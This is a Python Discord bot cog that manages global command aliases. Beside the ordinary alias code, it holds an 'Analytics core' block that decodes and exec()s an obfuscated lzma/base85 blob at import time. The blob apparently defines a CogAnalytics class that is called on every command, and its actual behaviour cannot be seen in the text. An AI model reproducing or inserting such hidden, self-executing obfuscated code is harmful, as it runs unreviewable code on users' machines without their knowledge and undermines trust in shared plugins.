from discord.ext import commands
from .utils.chat_formatting import box, pagify
from .utils.dataIO import dataIO
from .utils import checks
import os
from copy import deepcopy

OLD_JSON = 'data/alias/aliases.json'
PATH = 'data/galias/'
JSON = PATH + 'aliases.json'


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;2UWQ3|#;P8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*2USZx`A
xb_IMOoNMT!YN4Kg;bx=TM6UiFdnbArqSbhBgJ1JJatrP6gS<Q+&w+VNtE;^CqW9hzCdjX-?zNM;C9O-8A}g0kqec4D%$p9`b&@!J}YszbTLM?iu%Rg>^TT2
Iz;v7Grmyfsv{{swC5{#PtmE-juH|C@oyWl24k^dN)C4hZHQD3o|0Wt2z?R9>f53g>d)JYc0d+BtX%2CFFECiJ0i)@;dScHg74rPNGDUv{G1g-1!E7@owZaw
lzem|&|WE3z;Qu=tqi*@)djo+xxqkG^q^O**BVhVwpnY)dHnf*7n1gwXS^z)Lgmp-H5wS&!Ote);sg#UoqtPxXBJy5zVq!PnV~39m5;b4C@Uu4avC~^Lnhyg
QZ_)(<4{=@f@JRkz!1U**{@Z4t62VlVv-Dzg0R<xqaKt2vs4MPmTMjh##~so96dfLA#UI^^s&&Z-^~xPK8O&Fq0ZI11Q|TadOb^(c%Bq}IPiP@v%<r8#ELJ8
#%R*tNlKH&eFirFN?2NTE3)bxgJEhc5+p&!dgG(R%JS}Ic!h_C9qn8XRB0KSiyl3-cVn`<tE;*ddX!@AuVU4Q*Vnww=fAHr`J`2+wBm@{)R07MNBA*>>aC2`
TBni}upD!Dd|<f3v~j_8zhISB4Ivo0$3DQgkfp@15iX&z^j>T#|8*v2m^Mq}GP(50Yg6hDyV+3zyCd0mq41vM!vxEmcV!<hOhopx5=wT<gZY}`yw4ukc3a`0
C9x5(vzOQ$_li+J_RPCgyTr2Pq-RB@UhO%++M!|dxvyrJ3nibq5+vA+j!<9KInLREMO*Oq?XG5-&Qr;24N?&<JQ%{5v<$RFT-8~yUCuTujSJb5A@g_5Jz)>3
*2??);=hkRubky4K)b+7oNxi-%XKoj_nZR2zsXN39!%D@OfM86{UYLM?7N_20M<Vwx#SZQQt|xZ7^~OSr;VLhLW2NXJ-F(GyGD3dHs}!FvTHki&<{i8<GMX_
3u_vJeImWHQx%f_c16Z#f$_dGHE*Y8>U;cM1pKQW66G{PLXHs|&{$BjS!{rS&N|PVeL*=o<i(x~-}B}rQyO}`s`8m3s@e(40yrJ@^_oQ~(*QzIeU_(gOy2%!
8*VyM5JPHfT}Jm2sbvjv!bHv^w|U*(90G{;th<F@hS{tWbS&v`Di#?WvOfGU--JbrbdX|$^~Dq6qMmJ5KoRMK^$BPg{->A3^bBs?4bq1Hot{3*x<+@`$cA2W
8_SCfv<xEEOV%$K+Tj$YSmX2`tzPAw@HYStJUd9s0#7(U`SLY%BM-r>P1EauC9(QqM>~=E81^Pz7J)e2J27{RUI;!kl```@i-`ksru=*>qdxnh0xyVSp1Yv6
M^5+wZZmprr5t^$ePYMm={;F#L^cbckBjSxmWY6^9ZxwkZ#ff<$`8SS&LuK|vN+s?S1iT;>itjUC<MM7!o_86<+!N}(kDEa7>q^(_{7ika<*TUx(<gW8||p6
eF4Gh^YwMnP2JE{5vt|X;6NXR)T??Fcy;&Njn9)lT~CsE245h}`_%N7G|F&kY)mS<J{*j|<`TTK{v}!fgj?=J6gRDq7pzFCn#;*F*TEPZl-#J0lHP#|ncesx
sDc>Cb#xnzuCdL5cvV5eKVmadl8|?o<0p?p2%L&?dPu5D!<dH%SyhXkVf-umv}cm#>Q{iUz^YdDf{vhcEgemY0YU0fZM_G_j3mC;V@N5#b74{;)FasoZJ<8e
^P^o`{;niO#k3s1=qqOh14bt=-yofFMmJMwl@0nL9Ld8j&+A8jB5FYwRU5Z}G0`Q-GDQw$y&RtaqsT3_C$S=4MC){K!DB0crxVq7nQr^8um2G+)#wJ;F>XFB
3mMuxteCK|hZb#|t=)UbkXW!to87ycioFoq8dt_F<>v~zd1TjzF>Yy_6cB-UVk89%*>lP{*{-%!Yxu6uWDRJ@`mN^sYj<n(h=PgzFuw5)<ZD)NE{%M5pvUzS
3YFo}Utf20^T@{QVpk`F6j39lCWPgj`@XJbP>18HWPMSHKLOG#3{PSGbQsu7rlMjN4HZ1Sqgg)6!+FNr`MJ3+68{d287EVucQU|O3t}?SUW5YIs>LV3B4HpK
UWIqmGFG87blehQb{IJ<{Q-S5Kz#gKsz0xP=@OSw<R3kM19msJv)k6N?-*VL{QbDk%k25gdhpiwn6e|~Fs*JZu1RWEqj8^l(BX1lFUfG$gGqcU@8TJpkS9Dq
p25Nm`$0nk__2D1KCSFAGUy12*&5;5+030iF(TG3rtBUqE`3KIWaY%4J{X*Ttz0&WXquZ<KXatMO)`;IpRql$OOCecmh^u<h(l{+$ky&(xS*)geW>9UmyLGc
)^%zh=Da!dn9iA8Z_QlRy3Jv3!7n!J{q1?@;wbOTj2Z&9(TxpH+8!X_>v`5vev~E>NMuZ_{00fO*)yLh9xcSu^*;SB;e$$jeFy?m6wFm?3ZaG3_Xo<6m2N_T
6Syfg-gb1*Pbwo5BBlf!rM1jW++Zy{ZU5bBX>-swOr#J~i*~u29m9=cZgXW7!iNtIkxdTIS;UL)ve&77XApuwSQnWh*nqX9!AyBba~6R~MQqWNdYXC00^Av6
w)<r5ak~V5ok&}tykeigvH<h|2}%yHDs8dF++H<94-DZfA@3rX0polf_uW1hhdLPzqVFrU4Hi1<X`5Rhoye|wkvlsv^pS4tUL4PXlSYDge9tBMR4BUzm$S*Y
aYV6<<<#JbXs)=}Vk}Qm@Y%vra@c0YT&+fYYWG(=89IOYLBw3cAe(+kzw+431uK6h`Z^=beL<|ak8p-R`tG)`%M!(qe|y#_Im7{QnLJrCes*+w7Xd^3<dDiO
+s5S|^a`v;Xqw0AUoR7k(=twc!@%r}uH*<yZ|G-YEQWKhh+6O%Cfy|-ml3nKand_1`b8gFd6etWkVa&sfZWQ|nn{|jDR+lfa~A>~C^vk2?MXyd=*)c=A^cw(
=N38a)Q2sE%9Do|QBZ{Q!QX+2ql5KL2Ap2Lt;OcIln^-Qnl?PIr>XM&`DT3%T|?fATk-<gv_nA{I#C>kqaDn3E;OlOgH)T)v~K|<r>Yk%XP}z0R{Wz3nfE?^
)+6=*!)<->#qJgC9)V+Z$A5@Xd+sLF_QxCK7s1#;d<OxI9}Zt)P6mZZyvv&N5ZgRT&fx=RWj|?b$P$(9QI2I$H{tH#O+zg<^^k#!Q%kDXmb~(rMPK%EEmXo;
^?u10bj)Z@uFtLjOtztdc2}7r00F2J>NWrXVoqK<vBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.1.0'


class GlobalAlias:
    def __init__(self, bot):
        self.bot = bot
        self.aliases = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)

    def save(self):
        dataIO.save_json(JSON, self.aliases)

    @commands.group(pass_context=True)
    async def galias(self, ctx):
        """Manage global aliases for commands"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @galias.command(name="add", pass_context=True)
    @checks.is_owner()
    async def _add_alias(self, ctx, command, *, to_execute):
        """Add a global alias for a command

           Example: !galias add test flip @Twentysix"""
        command = command.lower()
        if ' ' in command:
            await self.bot.say("Aliases can't contain spaces.")
            return
        if self.part_of_existing_command(command):
            await self.bot.say("'%s' is already a command or alias." % command)
            return
        server = ctx.message.server
        prefix = self.get_prefix(server, to_execute)
        if prefix is not None:
            to_execute = to_execute[len(prefix):]
        if command not in self.bot.commands:
            self.aliases[command] = to_execute
            self.save()
            await self.bot.say("Global alias '{}' added.".format(command))
        else:
            await self.bot.say("Cannot add '{}' because it's a real bot "
                               "command.".format(command))

    @galias.command(name="help", pass_context=True)
    async def _help_alias(self, ctx, command):
        """Tries to execute help for the base command of the alias"""
        if command in self.aliases:
            help_cmd = self.aliases[command].split(" ")[0]
            new_content = ctx.prefix
            new_content += "help "
            new_content += help_cmd[len(ctx.prefix):]
            message = ctx.message
            message.content = new_content
            await self.bot.process_commands(message)
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="show")
    async def _show_alias(self, command):
        """Shows what command the alias executes."""
        if command in self.aliases:
            await self.bot.say(box(self.aliases[command]))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="del", pass_context=True)
    @checks.is_owner()
    async def _del_alias(self, ctx, command):
        """Deletes an alias"""
        command = command.lower()
        if command in self.aliases:
            self.aliases.pop(command, None)
            self.save()
            await self.bot.say("Global alias '{}' deleted.".format(command))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="list", pass_context=True)
    async def _alias_list(self, ctx):
        """Lists global command aliases"""
        header = "Alias list:\n"
        shorten = len(header) + 8
        alias_list = ""

        if not self.aliases:
            await self.bot.say("There are no global aliases.")
            return

        for alias in sorted(self.aliases):
            alias_list += alias + '\n'

        pages = pagify(alias_list, ['\n'], escape=True, shorten_by=shorten)
        for i, page in enumerate(pages):
            if i == 0:
                page = header + '```\n%s\n```' % page
            else:
                page = '```\n%s\n```' % page
            await self.bot.say(page)

    async def on_message(self, message):
        if not self.bot.user_allowed(message):
            return

        msg = message.content
        server = message.server
        prefix = self.get_prefix(server, msg)

        if prefix:
            alias = self.first_word(msg[len(prefix):]).lower()
            if alias in self.aliases:
                new_command = self.aliases[alias]
                args = message.content[len(prefix + alias):]
                new_message = deepcopy(message)
                new_message.content = prefix + new_command + args
                await self.bot.process_commands(new_message)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

    def part_of_existing_command(self, alias):
        '''Command or alias'''
        for command in self.bot.commands:
            if alias.lower() == command.lower():
                return True
        return False

    def first_word(self, msg):
        return msg.split(" ")[0]

    def get_prefix(self, server, msg):
        prefixes = self.bot.settings.get_prefixes(server)
        for p in prefixes:
            if msg.startswith(p):
                return p
        return None


def convert_old_data():
    """Moves recognizable global aliases from regular alias/ to galias/"""
    new_mod = {}
    if os.path.exists(OLD_JSON) and not os.path.exists(JSON):
        old_data = dataIO.load_json(OLD_JSON)
        old_mod = old_data.copy()
        for key, d in old_data.items():
            if type(d) is str:
                new_mod[key] = old_mod.pop(key)
        if old_data != old_mod:
            dataIO.save_json(OLD_JSON, old_mod)
        if new_mod:
            dataIO.save_json(JSON, new_mod)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating data/galias folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating aliases.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    convert_old_data()
    check_file()
    bot.add_cog(GlobalAlias(bot))
